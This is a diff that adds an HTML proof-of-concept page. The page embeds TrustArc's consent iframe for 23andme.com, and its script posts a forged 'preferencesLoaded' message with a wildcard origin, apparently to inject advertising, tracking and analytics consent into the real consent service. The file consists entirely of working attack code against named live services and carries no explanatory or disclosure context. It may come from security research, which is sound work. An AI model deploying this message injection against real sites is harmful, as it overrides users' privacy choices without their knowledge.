@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TrustArc iframe Message Injection PoC</title>
+</head>
+<body>
+  <h2>Testing Message Injection to blog.23andme.com</h2>
+
+  <iframe
+    id="trustarc_iframe"
+    src="https://consent.trustarc.com/notice?domain=23andme.com&origin=https://blog.23andme.com"
+  ></iframe>
+
+  <script>
+    setTimeout(() => {
+      const iframe = document.getElementById("trustarc_iframe");
+      if (iframe && iframe.contentWindow) {
+        iframe.contentWindow.postMessage({
+          event: "preferencesLoaded",
+          consentCategories: ["advertising", "tracking", "analytics"]
+        }, "*");
+        console.log("Message sent to TrustArc iframe");
+      }
+    }, 2000);
+  </script>
+</body>
+</html>
